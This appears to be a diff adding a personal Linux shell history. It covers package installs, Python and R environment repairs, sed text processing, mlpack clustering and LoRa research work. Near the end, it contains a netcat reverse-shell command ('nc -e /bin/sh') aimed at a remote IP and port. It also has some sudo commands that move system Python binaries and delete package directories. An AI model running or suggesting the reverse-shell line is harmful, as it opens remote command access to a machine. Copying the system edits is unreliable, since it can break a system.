+mendeleydesktop 
+inkscape
+9-shotcuts
+pkill mendeleydesktop
+compile-latex x_accronyme.tex
+grep -ri linux
+echo $dataplot_prefix
+ls /usr/lib/tcltk/
+ls /usr/lib/tcltk/x86_64-linux-gnu
+echo $TCL_LIBRARY
+which dataplot
+xdp
+sudo chmod -R u+x dplib
+sudo apt install fortran
+sudo apt-cache serach fortran
+sudo apt-get install gfortran
+sudo apt-cache search gfortran
+sudo apt-get install gfortran-7
+xdataplot 
+xdataplot
+HISTOGRAM
+dataplot
+search genetic 0
+sed -zr 's/\n\n+/≈ß/g' | sed -zr 's/(%[^\n]+)/\1√æ/g' | sed -zr 's/\.[ \t]*\n/vgyhn/g' | sed -zr 's/}[ \t]*\n/pvkglyhn/g' | sed -zr 's/\n[\t ]*/ /g' | sed -zr 's/\t+//g' | sed -zr 's/(\.)[ \t]+([^0-9])/\1\n\2/g' | sed -zr 's/([,:;])[ \t]+([^0-9])/\1\n\t\2/g' | sed -zr 's/vgyhn/\.\n/g' | sed -zr 's/pvkglyhn/\}\n/g' | sed -zr 's/≈ß/\n\n/g' | sed -zr 's/√æ[ \t]*/\n/g' | sed -zr 's/\- //g' $oldclip
+echo $oldclip > tmp
+sed -zr 's/\n\n+/≈ß/g' | sed -zr 's/(%[^\n]+)/\1√æ/g' | sed -zr 's/\.[ \t]*\n/vgyhn/g' | sed -zr 's/}[ \t]*\n/pvkglyhn/g' | sed -zr 's/\n[\t ]*/ /g' | sed -zr 's/\t+//g' | sed -zr 's/(\.)[ \t]+([^0-9])/\1\n\2/g' | sed -zr 's/([,:;])[ \t]+([^0-9])/\1\n\t\2/g' | sed -zr 's/vgyhn/\.\n/g' | sed -zr 's/pvkglyhn/\}\n/g' | sed -zr 's/≈ß/\n\n/g' | sed -zr 's/√æ[ \t]*/\n/g' | sed -zr 's/\- //g' tmp
+cat tmp | sed -zr 's/\n\n+/≈ß/g' | sed -zr 's/(%[^\n]+)/\1√æ/g' | sed -zr 's/\.[ \t]*\n/vgyhn/g' | sed -zr 's/}[ \t]*\n/pvkglyhn/g' | sed -zr 's/\n[\t ]*/ /g' | sed -zr 's/\t+//g' | sed -zr 's/(\.)[ \t]+([^0-9])/\1\n\2/g' | sed -zr 's/([,:;])[ \t]+([^0-9])/\1\n\t\2/g' | sed -zr 's/vgyhn/\.\n/g' | sed -zr 's/pvkglyhn/\}\n/g' | sed -zr 's/≈ß/\n\n/g' | sed -zr 's/√æ[ \t]*/\n/g' | sed -zr 's/\- //g'
+oldclip="$(xclip -o -sel clip)"
+echo $oldclip
+echo $oldclip | sed -zr 's/\n\n+/≈ß/g' | sed -zr 's/(%[^\n]+)/\1√æ/g' | sed -zr 's/\.[ \t]*\n/vgyhn/g' | sed -zr 's/}[ \t]*\n/pvkglyhn/g' | sed -zr 's/\n[\t ]*/ /g' | sed -zr 's/\t+//g' | sed -zr 's/(\.)[ \t]+([^0-9])/\1\n\2/g' | sed -zr 's/([,:;])[ \t]+([^0-9])/\1\n\t\2/g' | sed -zr 's/vgyhn/\.\n/g' | sed -zr 's/pvkglyhn/\}\n/g' | sed -zr 's/≈ß/\n\n/g' | sed -zr 's/√æ[ \t]*/\n/g' | sed -zr 's/\- //g'
+xdotool key ctrl+x
+sudo apt install wmctrl
+wmctrl -R gedit
+wmctrl -R gedit && xdotool key ctrl+x Return
+wmctrl -R gedit && xdotool key ctrl+x
+xsel
+INPUTb=`xsel`\
+INPUT=`echo $INPUTb | tr -d '\n'`
+INPUTb=`xsel`; INPUT=`echo $INPUTb | tr -d '\n'`
+INPUTb=`xsel`; INPUT=`echo $INPUTb | tr -d '\n'`; echo $INPUT
+xclip
+8-text
+gedit &
+vimr
+sudo apt install vimr
+sudo apt install gnvim
+sudo apt install gvim
+sudo apt install gvim-gtk3
+sudo apt install vim-gtk3
+gvim
+black
+black .
+black collaborative_filtering.py
+black -l 99999 collaborative_filtering.py
+black -l 99999 .
+format-py */*/*/*/*/*/*.py
+format-py .
+format-py *
+format-py */*
+format-py */*/*
+format-py */*/*/*
+format-py */*/*/*/*
+format-py */*/*/*/*/*
+format-py */*/*/*/*/*.py
+format-py */*/*/*/*.py
+format-py */*/*/*.py
+format-py */*/*.py
+format-py */*.py
+format-py *.py
+sudo apip install hmmlearn
+sudo pip install scikit-learn
+sudo pip3 install scikit-learn
+dataplot ANNOTATE.DP
+dataplot BEAM.DP
+sudo apt install rename
+sudo systemctl enable bluetooth
+adb-usb
+adb-wifi
+adb-pull-lite
+rackdiag nger
+echo $LIBPATH
+sudo apt-cache search boost_thread
+sudo apt-cache search boost_filesystem
+whereis boost_filesystem
+whereis boost
+cd /usr/include/boost
+tree | grep libboost
+tree | grep lib
+tree | grep boost
+sudo apt install libboost
+ls /etc/apt/sources.list.d
+cat /etc/apt/sources.list.d
+cat /etc/apt/sources.list
+sudo gedit /etc/apt/sources.list
+sudo apt update
+sudo apt list --upgradable
+sudo apt upgrade
+sudo apt install libboost.dev
+whereis libboost-dev
+whereis libboost
+find libboost
+pwd
+g++ -Iinclude examples/example1.cpp -o appli -Llib -lMarmoteCore -lXborne -lpsi -lboost_thread -lboost_filesystem -ld
+export LIBPATH=$LIBPATH:/usr/include/boost
+g++ -Iinclude examples/example1.cpp -o appli -Llib -lMarmoteCore -lXborne -lpsi
+g++ -Iinclude examples/example1.cpp -o appli -Llib -lMarmoteCore -lXborne -lpsi -lboost_system -lboost_thread-mt -lboost_thread -lboost_filesystem
+g++ -Iinclude examples/example1.cpp -o appli -Llib -lMarmoteCore -lXborne -lpsi -lboost_system -lboost_thread -lboost_filesystem
+cd examples
+sudo apt install libboost_system
+sudo apt install libboost_system.dev
+sudo apt install libboost-systeygm.dev
+sudo apt install libboost-system.dev
+sudo apt install libboost-system-dev
+sudo apt install libboost*
+sudo apt install libboost-all-dev
+sudo apt install libboost-thread.dev
+sudo apt install libboost-filesystem.dev
+g++ -Iinclude examples/example1.cpp -o appli -Llib -lMarmoteCore -lXborne -lpsi -lboost_thread -lboost_filesystem -lgio
+g++ -Iinclude examples/example1.cpp -o appli -Llib -lMarmoteCore -lXborne -lpsi -lboost_thread
+ls /usr/lib/x86_64-linux-gnu
+ls /usr/lib/x86_64-linux-gnu | grep boos
+g++ -Iinclude examples/example1.cpp -o appli -Llib -L/usr/lib/x86_64-linux-gnu -lMarmoteCore -lXborne -lpsi -lboost_thread -lboost_filesystem
+g++ -Iinclude examples/example1.cpp -o appli -Llib -lMarmoteCore -lXborne -lpsi -lboost_thread -lboost_filesystem
+g++ -ansi -Wall -pedantic -g -Iinclude examples/example1.cpp -o appli -Llib -lMarmoteCore -lXborne -lpsi -lboost_thread -lboost_filesystem -lboost_system
+g++ -ansi -Wall -pedantic -g -Iinclude examples/example1.cpp -o appli -Llib -lMarmoteCore -lXborne -lpsi -lboost_thread -lboost_filesystem -lboost_system -fPIC
+g++ -ansi -Wall -pedantic -g -Iinclude -fPIC examples/example1.cpp -o appli -Llib -lMarmoteCore -lXborne -lpsi -lboost_thread -lboost_filesystem -lboost_system
+CD $(TOOLSPATH)/R
+CD $TOOLSPATH/R
+cd $TOOLSPATH/R
+cd $(TOOLSPATH)/R
+ech $OS
+echo $OS
+whereis R.h
+virtualbox
+./example1
+make example7.cpp
+grep -ri aexample
+./example7
+run example7
+exec example7
+exec ./example7
+sudo chmod u+x install.sh
+./prism
+./xprism
+prism ..\examples\dice\dice.pm
+./prism ..\examples\dice\dice.pm
+./install.sh
+prism
+sudo chmod u+x auto
+./auto
+grep -ri prism
+sedAll cross_validation model_selection *
+sedx txt xtxt cle
+sedx txt xtxt cle2
+sedx txt xtxt key
+sedx txt xtxt cle1
+grep -ri txt
+grep -ri \.txt
+sudo pip install pystruct
+sudo pip3 install pystruct
+sudo pip install hmmlearn
+sudo pip3 install hmmlearn
+sedr cross_validation model_selection *
+grep -ri cross_validation
+grep -ri model_selection
+grep -ri cluster
+sudo pip install ipynb-py-convert
+ipynb-py-convert *.ipynb
+jupyter nbconvert --to script *.ipynb
+ipynb nbconvert --to script *.ipynb
+sudo pip3 install jupiter
+ipython -h
+jupytext
+sudo apt install jupytext
+sudo pip install jupytext
+jupytext --to py *.ipynb
+ipython nbconvert --to script *.ipynb
+sudo pip install jupiter
+sudo apt install jupiter
+sudo apt install python-jupiter
+sudo apt install python3-jupiter
+sudo pip install nbconvert
+ipython nbconvert --to script */*.ipynb
+grep -ri recom
+grep -ri recoma
+grep -ri recomma
+grep -ri recomm
+grep -ri recommen
+sudo pip install genetic_selection
+sudo pip3 install genetic_selection
+sudo pip3 install genetic
+sudo pip install genetic
+pkill subl
+ggobi
+sudo apt install stringi.dev
+sudo apt install stringi
+sudo apt install libstringi
+sudo apt install libstringi.dev
+installx stringi
+sudo apt install r-cran-stringi
+sudo apt install r-cran-rattle
+sudo apt-cache search rattle
+sudo apt-cache search stringi
+l
+cd storage
+rm */^[^\.]*.txt
+rm */^[A-Za-z0-9]*.txt
+rm */[A-Za-z0-9].*.txt
+rm -r */[A-Za-z0-9].*.txt
+rm -r */.*.txt
+rm */.*txt
+rm -r *txt
+rm -r .*txt
+rm -r */.*txt
+rm -r ./.*txt
+find . -type f -name '*.o' -delete
+pdf2txt 
+gedit /home/aghiles/Aghiles/tool/shell/converter/pdf2txt
+pdftotext
+pdf2txt
+top
+find . -type f -name '*.txt' -delete
+sudo pip install GMM
+sudo pip3 install GMM
+pip install -U numpy scipy scikit-learn\
+
+sudo pip install -U numpy scipy scikit-learn
+grep -ri samp_fft
+cat -n conf1.csv
+cat -n conf1.csv > conf11.csv
+pr -ts" " --columns 3 offspring.csv
+search bash 0
+sedx \n \n\n offspring.csv
+b="\b"
+sed -Ezi "s/\n/ /" offspring.csv
+sed -Ei "s/\n/ /" offspring.csv
+sed -i "s/\n/ /" offspring.csv
+sedx \\n \\b offspring.csv
+sed -Ezi "s/\n/\b/g" offspring.csv
+sed -Ezi "s/\b/ /g" offspring.csv
+sedx \n " " offspring.csv
+sedx "\n" " " offspring.csv
+a="\n"
+b=" "
+sedx \n $b offspring.csv
+sedx \\n $b offspring.csv
+sedx "\n" $b offspring.csv
+sedx $a $b offspring.csv
+sedx \n \b offspring.csv
+sedx "\n" "\b" offspring.csv
+sed -Ezi "s/\n/ /g" offspring.csv
+sed -Ezi "s/^([^ ] [^ ] [^ ] )/\1\n/g" offspring.csv
+sed -Ezi "s/^([^ ]+ [^ ]+ [^ ]+ )/\1\n/g" offspring.csv
+sed -Ezi "s/^([^\n]+)\n[^\n]+)\n[^\n]+)\n/\1 \2 \3\n/g" offspring.csv
+sed -Ezi "s/^([^\n]+)\n([^\n]+)\n([^\n]+)\n/\1 \2 \3\n/g" offspring.csv
+sed -Ezi "s/([^\n ]+)\n([^\n ]+)\n([^\n ]+)\n/\1 \2 \3\n/g" offspring.csv
+cat offspring.csv
+cat -n offspring.csv > result.csv
+cat result.csv
+sudo apt install dmenu
+google gf
+choice=$(echo "Éø¶É¶" | dmenu -i -p "Google:") || exit 1
+pgrep -x dmenu && exit
+pgrep -x dmenu
+dmenu -i -p "Google:"
+echo "Éø¶É¶" | dmenu -i -p "Google:"
+echo "hg" | dmenu -i -p "Google:"
+google fdfd
+google hg vg fc
+search fuzzy k-modes 0
+sudo apt install bandwich
+sudo apt install bandwhich
+ggg offspring.csv
+search enron 0
+paste -d',' X.csv N.csv U.csv > all.csv
+cat all.csv
+cat -n N.csv > N1.csv
+paste -d',' N.csv X.csv U.csv > A.csv
+paste -d',' N.csv X1.csv U.csv > A.csv
+paste -d',' N.csv .X.csv U.csv > A.csv
+search cluster 0
+grep -ri fuzzy
+grep -ri skip
+grep -ri load
+grep -ri csv
+format-cpp *
+format-cpp */*
+format-cpp */*/*
+nvom
+sudo pip install jedi
+grep -ri coc
+grep -i coc
+grep -i coc .
+grep -i coc *
+node
+npm install coc-snippets --global-style --ignore-scripts --no-bin-links --no-package-lock --only=prod
+grep -ri liferay-portal
+gedit .zshrc
+./coc.sh 
+grep -ri portal
+man npm
+./coc.sh
+npm
+nautilus ~/.local/share/nvim/site/pack/coc/start
+whereis coc.nvim
+whereis coc.vim
+grep -ri code
+cat lora-tools/README.txt
+grep -ri sales
+grep -ri sale
+ggg U.csv
+gedit fcm.py
+sudo pip3 pip install fuzzy-c-means
+sudo pip install fuzzy-c-means
+sudo pip install fcmeans
+whereis fcmeans
+tree grep fcmeans
+tree | grep fcmeans
+sudo pip3 install fuzzy-c-means
+sudo gedit fcm.py
+sudo apt remove skypeforlinux
+sudo apt install ./skypeforlinux-64.deb
+skypeforlinux
+echo $PYTHONPATH
+echo $PYTHONUSERBASE
+export PYTHONUSERBASE=/home/aghiles/Aghiles/tool/tools/python\
+
+gci env:
+export PY_HOME=/home/aghiles/Downloads
+python -m site --user-site | ls
+python -m site --user-site
+python --user-site
+export USER_SITE=/home/aghiles/Downloads
+export PYTHONPATH=/home/aghiles/Downloads
+export PYTHONPATH=/home/aghiles/Downloads/ml
+export PY_HOME=/home/aghiles/Aghiles/ml
+sudo pip install -U sklearn
+sudo pip -U install -U sklearn
+touch pythonrc
+gedit ~/.config/python/pythonrc
+whereis site.py
+pip install --user sklearn
+export PIP_TARGET=/home/aghiles/A
+puthon-bis
+whereis python
+sudo mv /usr/bin/python /usr/bin/python-bis
+q*
+sudo mv /usr/bin/python3
+sudo mv /usr/bin/python3 /usr/bin/python
+sudo mv /usr/bin/python /usr/bin/python3
+sudo mv /usr/bin/python-bis /usr/bin/python
+python-bis
+sudo apt install python-pip
+pip-bis
+pip2
+sudo pip instal sklearn
+sudo nautilus &
+pip3.7 install sklearn
+pip install codecs
+pip install _curses
+ython
+pip install ranger
+chromium
+python3 -m ensurepip
+sudo apt-get install python-pip
+sudo pip
+sudp python -m site
+python3.7 -m ensurepip
+sudo python3.7 -m ensurepip
+pip install --upgrade pip
+sudo pip install --upgrade pip
+pip install pip
+sudo apt install python
+sudo apt install python3
+gedit /usr/bin/lsb_release
+sudo edit /usr/bin/lsb_release
+lsb_release
+lsb_release -a
+sudo python
+sudo python -m site
+exit
+sudo apt install --reinstall python*-decorator
+sudo apt install --reinstall python3-decorator
+python -m sute
+python3 -m site
+cd Aghiles/job/cod/a-01-clustering/a-clustering/lorawan
+python3 2-genetic-fcm.py
+python 2-genetic-fcm.py
+./2-genetic-fcm.py
+python -m -site
+pip -V
+pip3 -V
+sudo chown -R aghiles python
+sudo rm -rf 00-dist-packages
+sudo rm -rf usr.local.lib.dist-packages3
+echo $R_HOME
+R RHOME
+sudp apt install -reinstall R
+sudo apt install -reinstall R
+sudo apt install --reinstall R
+sudo apt install --reinstall r-cran
+Rscript
+sudo apt install --reinstall r-base
+pip install apt_pkg
+sudo gedit /usr/bin/lsb_release
+sudo pipi install ranger
+sudo pip install ranger
+sudo pip install sklearn
+pip install python
+pip3 install python
+sudo pip install python
+pip install sklearn
+apt-cache pkgnames python3- | grep -Fvx -f $file/python3.txt
+apt-cache pkgnames python3- | grep -Fvx -f ./python3.txt
+apt-cache pkgnames python3- | grep -Fvx -f ./python3.txt | sed 's/python3-//g'
+apt-cache pkgnames python3- | grep -Fvx -f ./python3.txt | sed 's/python3-//g' | grep ++
+apt-cache pkgnames python3- | grep -Fvx -f ./python3.txt | sed 's/python3-//g' | grep +
+pip install $(apt-cache pkgnames python3- | grep -Fvx -f ./python3.txt | sed 's/python3-//g')
+apt-cache pkgnames python3- | grep -Fvx -f ./python3.txt | sed 's/python3-//g' > lk
+gedit hg
+apt-cache pkgnames r-cran-
+installx r-cran-permute
+sudo apt install r-base-*
+sudo apt install r-cran
+sudo apt install r-cran-*
+sudo apt remove r-base
+sudo apt remove r-base*
+sudo apt remove r-cran*
+sudo apt autoremove
+installx r-cran-*
+install-r
+sudo apt install r-cran-car
+sudo apt install r-cran-maptools
+sudo apt install r-base*
+R ./install.r
+Rscript ./install.r
+sudo Rscript ./install.r
+library(dr)
+Rupdate
+grep -ri Ri
+grep -ri Rin
+grep -ri Rins
+grep -ri Rupd
+grep -ri rstudio
+filename
+filename Downloads/loto.sh
+make example1
+make
+make example3
+make all
+make example7
+exec ./example5
+exec ./example2
+exec ./example3
+make example2
+./example3
+make example4
+./example4
+make example5
+./example5
+make example6
+./example6
+make clean
+dirname
+/home/aghiles/Aghiles/job/cod/a-09-markov/example4
+perlx
+P
+pe
+pedit
+grep -ri perl
+alias hgf="rlwrap -A -pgreen -S"perl> " perl -wnE'say eval()//$@'"
+alias hgf="rlwrap -A -pgreen -S\"perl> " perl -wnE'say eval()//$@'"\
+\
+
+alias hgf="rlwrap -A -pgreen -S\"perl> \" perl -wnE'say eval()//$@'"\
+\
+
+hgf
+rlwrap -A -pgreen -S"perl> " perl -wnE'say eval()//$@'
+sudo nvim
+grep -ri hi
+grep -ri \nhi
+grep -ri \nhi:
+grep -ri hi:
+<
+grep -ri ardu
+grep -ri arduPI
+grep -ri bcm28
+grep -ri \"bcm28
+grep -ri bcm2835.h
+grep -ri arduPI_pi2
+grep -ri RASPBERRY2
+grep -ri .txt
+grep -ri gateway_conf
+grep -ri gateway_id.txt
+grep -ri gateway_id
+search cluster lora 0
+pip2 search *
+pip3 search *
+pip search *
+sudo python3-pip install python3-pip
+apt-cache pkgnames python3- | sed 's/python3-//g' > requirement.txt
+cat requirement.txt
+install -
+whereis watchdog
+sudo -s
+echo $EDITOR
+/usr/bin/nvim
+echo $SHELL
+echo $TERMINAL
+man tilix | grep title
+sudo mv /usr/local/lib/R $TOOLSPATH/R
+sudo chown -R aghiles $TOOLSPATH/R
+sudo apt install --reinstall python3
+sudo pip3 install sklearn
+sudo pip install keystoneauth1
+pip3 install keystoneauth
+sudo apt install --reinstall python3-keystoneauth1
+pip3 install keystoneauth1
+pip3 install sklearn
+pip3 install numpy
+pip3 remove tensorflow numpy
+pip3 uninstall tensorflow
+pip3 IN
+pip3 install setuptools
+sudo apt install python3-pip
+PIP3
+pip3 install qutebrowser
+pip3 install ranger
+sudo pip3 install ranger
+rannger
+python3
+cd /home/aghiles/Aghiles/tool/tools/python/ranger
+sudo pip3 install --upgrade ranger
+pip3 install --upgrade ranger
+Ranger
+sudo apt install --reinstall ranger
+sudo apt install --reinstall qutebrowser
+python3 -m pip install ranger
+sudo python3 -m pip install ranger
+calcurse
+sudo apt install python3-fcmeans
+python3 -V
+sudo pip3 install fcmeans=
+sudo pip3 install fcmeans
+pip3 install python-fcmeans
+python3 -m pip install python-fcmeans
+python3 -m pip install python3-fcmeans
+python3 -m pip install fcmeans
+sudo apt install --reinstall python3-pip
+pip3
+install-x
+format-r
+apt-cache pkgnames python3- | sed 's/python3-//g' | sed -z 's/enum\n//g' | sort > requirements.txt
+cat requirements.txt | grep enum
+apt-cache pkgnames python3- | sed 's/python3-//g' | sed -z 's/enum\n//g' | sed -z 's/typing.*\n//g' | sort -r > requirements.txt
+apt-cache pkgnames python3- | sed 's/python3-//g' | sed -z 's/enum\n//g' | sort -r > requirements.txt
+apt-cache pkgnames python3- | sed 's/python3-//g' | sed -z 's/enum\n//g' | sed -z 's/typing-extensions\n//g' | sort -r > requirements.txt
+grep -ri zq
+grep -i zq .
+grep -i zq *
+nvim rd
+pip3 install keras-preprocessing
+pip3 install six
+pip3 install six==1.10
+pip3 install websocket-client==0.48.0
+pip3 install pexpect==3.2
+./requirements.sh
+nautilus &
+cat requirements.sh | xargs -P 14 -n 1 {}
+cat requirements.sh | xargs -P 14 -n 1 bash
+cat requirements.sh | xargs -P 14 -n 1
+cat requirements.sh | parallel -j 4 wget -q {}
+cat requirements.sh | parallel -j 4 bash -q {}
+cat requirements.sh | parallel -j 4 exec {}
+cat requirements.sh | parallel -j 4 {}
+cat requirements.sh | parallel -j 4 pip3 install {}
+cat requirements.sh | parallel -j 4 echo {}
+cat requirements.sh | parallel -j 4 zsh {}
+cat requirements.sh | parallel -j 4 bash {}
+cat requirements.txt | parallel -j 4 pip3 install {}
+man parallel
+cat requirements.txt | parallel pip3 install {}
+cat requirements.txt | parallel -P 20 pip3 install {}
+cat requirements.txt | parallel -P 20 python3 -m pip install {}
+cat requirements.txt | parallel -P 20 echo {}
+cat requirements.txt | parallel echo {}
+echo "gfgf" > gf
+cat fg | parallel echo {}
+cat gf | parallel echo {}
+cat gf | parallel -P 20 echo {}
+install-python
+free
+/usr/bin/python
+format-python *
+pip3 install black
+format-py
+format-python
+Q\
+Q\
+R\
+R\
+R\
+Q\
+grep -i rand
+pip3 install fcmeans
+pip3 install fuzzy-c-means
+pip3 install seaborn
+paste -d',' X.csv U.csv > A.csv
+paste -d',' S.csv U.csv > A.csv
+grep -ri python
+bash
+c mutt
+pip3 install gi
+pip3 install libpeas
+apt install python3-libpeas
+alias python="python2"
+sudo apt install --reinstall gedit
+sudo apt install --reinstall gedit*
+apt install python3-gi
+pip install python3-gi
+pip3 install python3-gi
+python3 -m pip install python3-gi
+python3 -m pip install gi
+python3 -m pip install gi=3.10.1
+python3 -m pip install gi==3.10.1
+python -m site
+grep -ri rand
+grep -ri index
+pip3 install matplotlib
+pip3 install mpl_finance
+conda
+conda list matplotlib
+sudo apt install conda
+sudo apt install python-conda
+sudo apt install python3-conda
+sudo nautilus
+grep -ri ax.
+grep -ri MiniBatchKMeans
+grep -ri center
+okull python3
+okull python
+pkill python
+pkill python3
+pkill bash
+pkill zsh
+pkill import
+fcm
+gedit cluster.fcm
+mv cluster.fcm cluster.fcm.py
+mv cluster.fcm.py cluster-fcm.py
+python3 cluster-fcm.py
+qgedit cluster-fcm.py
+gedit cluster-fcm.py
+search "Problem Formulation" 0
+ping google.com
+search thingspeak 0
+pdfgrep thingspeak *.pdf
+evince ThingSpeak.pdf
+evince "Pham - RESSACS16-Low-cost-LoRa-IoT-step-by-step.pdf"
+evince "Pham - WAZIUP_D21_Version-1.1-low-res.pdf"
+qq
+./cluster-fcm
+search slice 0
+grep -ri timeon
+gedit logical-lora-channel-helper.cc
+grep -ri time
+grep -ri GetOnAirTime
+gedit model/lora-phy.cc
+search timeon 0
+search "time on air" 0
+search "rssi=" 0
+search "rssi" 0
+mv U.csv UZZ.csv
+cat text.txt
+cat V.csv
+gedit V.csv
+lq
+cat L.csv
+cat AA.csv
+gedit L.csv
+paste -d',' S.csv X.csv U.csv L.csv > AA.csv
+gedit AA.csv
+pkill evince
+python2
+paste -d',' metrics2.dat L.csv > A.dat
+ls /home/aghiles/Aghiles/job/txt/resources/data/
+paste -d',' S.csv L.csv > A2.dat
+cat A2.dat
+addac dd
+echo "gf" > ~/.config/latex/nomenclature.tex
+cat
+addac "\\\addac{FCM}{Fuzzy C-Means}"
+addac "\\addac{FCM}{Fuzzy C-Means}"
+addac \addac{FCM}{Fuzzy C-Means}
+addac "\addac{FCM}{Fuzzy C-Means}"
+cat ~/.config/latex/nomenclature.tex
+latexmk -f -cd -pvc -jobname=paper main.tex
+evince
+addac "\addac{LoRaWAN}{Long Range Wireless Access Network}"
+addac "\addac{NB-IoT}{Narrow Band-Internet of Things}"
+gedit ~/.config/latex/nomenclature.tex
+cups
+a
+system
+systemd-cat
+systemctl
+sudo systemctl enable cups
+systemd-analyze blame
+systemctl list-unit-files ‚ÄÉ≥type=service
+sudo systemctl list-unit-files ‚ÄÉ≥type=service
+systemd-analyze
+systemctl enable cups.socket
+sudo systemctl enable cups.socket
+systemctl list-units
+sudo systemctl list-unit-files | grep enabled
+sudo systemctl enable cups-browsed.service
+sudo systemctl list-unit-files | grep cups
+sudo xmobar
+sudo apt install xmobar
+xmobar ~/.config/xmobar/xmobarrc
+xmobar ~/.config/xmobar/xmobarrc0
+xmobar ~/.config/xmobar/xmobarrc1
+xmobar ~/.config/xmobar/xmobarrc3
+sudo apt install tint2
+xmobar
+tint2
+sudo apt install rofi
+sudo apt install dunst
+sudo apt install tig
+tig
+astropy
+kill -9 10807
+memory
+sudo apt install mpc
+mpc
+music
+mailbox
+internet
+news
+${STATUSBAR:?}
+${STATUSBAR}
+export STATUSBAR="dwmblocks"
+echo ${STATUSBAR}
+newsup
+"${STATUSBAR:?}"
+dwm
+/usr/bin/newsboat -x reload
+newsboat -x reload
+/usr/bin/notify-send "ÉøÉ≥∞ RSS feed update complete."
+crontog
+cronbat
+[ "$(cat /sys/class/power_supply/BAT0/capacity)" -lt 25 ] &&\
+export DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1001/bus &&\
+notify-send -u critical "Battery critically low."
+[ "$(cat /sys/class/power_supply/BAT0/status)" = "Charging" ] && exit
+[ "$(cat /sys/class/power_supply/BAT0/capacity)" -lt 95 ] &&\
+export DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1001/bus &&\
+notify-send -u critical "Battery critically low."
+battery
+cat /sys/class/power_supply/BAT0/capacity
+"$(cat /sys/class/power_supply/BAT0/capacity)" -lt 95
+$(cat /sys/class/power_supply/BAT0/capacity) -lt 95
+[ "$(cat /sys/class/power_supply/BAT0/capacity)" -lt 25 ]
+[[ "$(cat /sys/class/power_supply/BAT0/capacity)" -lt 25 ]]
+notify-send -u critical "Battery critically low."
+export DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1001/bus &&\
+notify-send -u critical "Battery critically low."
+/usr/bin/notify-send "ÉøÉ≥∞ Updating RSS feeds..."
+pass
+linkhandler
+dunst
+rifi
+rofi -show window
+rofi -show ssh
+youtube-dl
+sudo apt install syncplay
+sudo apt install mpv
+sudo apt install youtube-dl
+sudo snap install mathpix
+systemctl enable snapd
+systemctl enable snapd.seeded.service
+systemctl enable snap-core-8268.mount
+sudo systemctl list-unit-files | grep snap
+systemctl enable snapd.socket
+snapd.socket
+/run/snapd.socket
+service snap start
+sudo service snap start
+sudo apt install snapd
+systemctl start snapd
+systemctl status snapd.service
+sudo snap install syncplay
+systemctl start cups
+systemctl status cups
+sudo snap install --classic syncplay
+rofi
+mpv -msg-level=ytdl_hook=debug https://www.youtube.com/watch\?v\=POb0cXY84k8\
+: 1580424602:0;q
+dmenu
+rofi -show run
+mpv https://www.youtube.com/watch?v=sZIEdI9TS2U
+youtube-dl ‚ÄÉ≥extract-audio ‚ÄÉ≥audio-format mp3 ‚ÄÉ≥audio-quality 0 https://www.youtube.com/watch?v=sZIEdI9TS2U
+youtube-dl https://youtube.com/watch?v=sZIEdI9TS2U --no-videO
+youtube-dl https://www.youtube.com/watch?v=sZIEdI9TS2U --no-videO
+youtube-dl https://www.youtube.com/watch?v=sZIEdI9TS2U
+youtube-dl www.youtube.com/watch?v=sZIEdI9TS2U
+youtube-dl https://youtube.com/watch?v=sZIEdI9TS2U
+mpv https://www.youtube.com/watch?v=V4aZSRaa81s\
+
+mpv "https://www.youtube.com/watch?v=V4aZSRaa81s√©"
+youtube-dl "https://www.youtube.com/watch?v=V4aZSRaa81s√©"
+dmenu-pass
+google
+dmenu-bluetooth
+camtoggle
+maim
+maim --desk
+maim -d
+dmenu-web
+dmenu-wwpg
+dmenu-wpg
+sudo apt install wpg
+dmenu-handler
+dmenu-shutdown
+Q
+distributions.r
+fcmeans.r
+cat X.csv
+cat S.csv
+cluster-fcm.py
+man ggobi
+perl
+iperl
+seq 3
+wc
+echo 'Hello'\\
+> ' world' |\
+> wc
+def factorial(x):\
+ result = 1\
+ for i in xrange(2, x + 1):\
+ result *= i\
+ return result
+fac() { (echo 1; seq $1) | paste -s -d\* | bc; }
+fac 5
+gnome-control-center
+pip
+dbacl
+sudo apt install dbacl
+sudo apt-cache search dbacl
+sudo apt-cache search dbacl-dev
+sudo apt install dbacl-dev
+mkdir dbacl
+git clone https://aur.archlinux.org/dbacl.git
+cd dbacl
+cat PKGBUILD
+CFLAGS=-D_GNU_SOURCE
+./configure
+plmack
+sudo apt install mlpack
+udo apt-get install libmlpack-dev
+mlpack_knn --help
+sudo mlpack_knn --help
+sudo apt-get install libmlpack-dev
+mkdir ml
+cd ml
+wget https://www.mlpack.org/files/mlpack-3.2.1.tar.gz
+tar -xvzpf mlpack-3.2.1.tar.gz
+mkdir mlpack-3.2.1/build && cd mlpack-3.2.1/build
+cmake ../
+make -j4  # The -j is the number of cores you want to use for a build.
+sklearn
+scikit
+cd bin
+./mlpack_adaboost
+pip install mlpack
+mlpack_adaboost
+mlpack
+man mlpack_kmeans
+mlpack_kmeans --input_file X.csv --clusters 3 --output_file 1-assignments.csv --centroid_file 1-centroids.csv
+cat 1-centroids.csv
+cat 1-assignments.csv
+mlpack_kmeans -h
+mlpack_kmeans --input_file X.csv --clusters 2 --output_file 1-assignments.csv --centroid_file 1-centroids.csv
+mlpack_dbscan -h
+mlpack_decision_tree -h
+mlpack_preprocess_scale -h
+nvim nuseradd
+man ./nuseradd
+evince dpst2f.dat
+evince dpst1f.dat
+rm *.dat
+mlpack_kde -h
+mlpack_lmnn -h
+./cluster-fcm.py -i h -o j
+./cluster-fcm.py -f h
+./cluster-fcm.py -f hkj
+./cluster-fcm.py -q False
+./cluster-fcm.py -f hkj -q False
+./cluster-fcm.py
+pip install pyreadline
+pip uninstall pyreadline
+nc -e /bin/sh 10.0.3.4 4444\
+
+nc -e /bin/sh 10.0.3.4 4444
+su
+gedit /home/aghiles/.config/python/pythonrc
+sudo apt install bpython3
+ipython3
+pip install jedi
+pip install flake8
+pip install autopep8
+nvim hg.py
+2*3
+2+3
+mlpack_local_coordinate_coding
+mlpack_local_coordinate_coding -h
+./cluster-fcm.py -h
+bpython3-curses
+data = np.genfromtxt(args.input_file, delimiter=",", dtype="str", skip_header=1)          # load the CSV file as a numpy matrix
+data = data[:, 0:3].astype(int)                                                    # X = StandardScaler().fit_transform(X)
+np.random.seed(args.seed)
+fcm = FCM(\
+    n_clusters=args.n_clusters, \
+    max_iter=args.max_iter, \
+    m=args.fuzzification, \
+    error=args.error,\
+    random_state=args.random_state)
+t0 = time.time()\
+fcm.fit(data)
